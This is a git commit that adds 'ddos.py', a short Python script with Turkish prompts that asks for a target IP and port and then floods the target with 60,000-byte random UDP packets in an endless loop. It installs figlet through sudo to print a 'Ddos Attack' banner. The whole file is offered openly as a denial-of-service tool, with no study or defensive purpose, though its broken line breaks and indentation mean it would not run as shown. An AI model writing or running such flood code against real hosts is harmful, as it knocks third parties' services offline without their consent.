fa06b6e2a260e532e1dfe26fc896403aeae15ef8
Homax-Luman <122665117+Homax-Luman@users.noreply.github.com>
2023-01-14 11:54:05 +0400

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,31 @@
+import os
+import random
+import socket
+
+os.system("sudo apt-get install figlet")
+os.system("clear")
+os.system("figlet Ddos Attack")
+print(" ")
+print("Author --> https://www.instagram.com/weklendy")
+print(" ")
+print(" ")
+target_ip = str(input("Hedef sitenin IP adresi --> "))
+print(" ")
+try:
+  target_port = int(input("Port numarası yazın (80) --> "))
+except ValueError:
+     print("Yanlıṣ yapdınız !!!")
+
+bytes = random._urandom(60000)
+
+sock = 
+socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+packega = 0
+
+while True:
+           sock.sendto(bytes,
+       (target_ip, target_port))
+            packega = packega+1
+              print("Number of packages 
+                sent --> %s" %(packega))
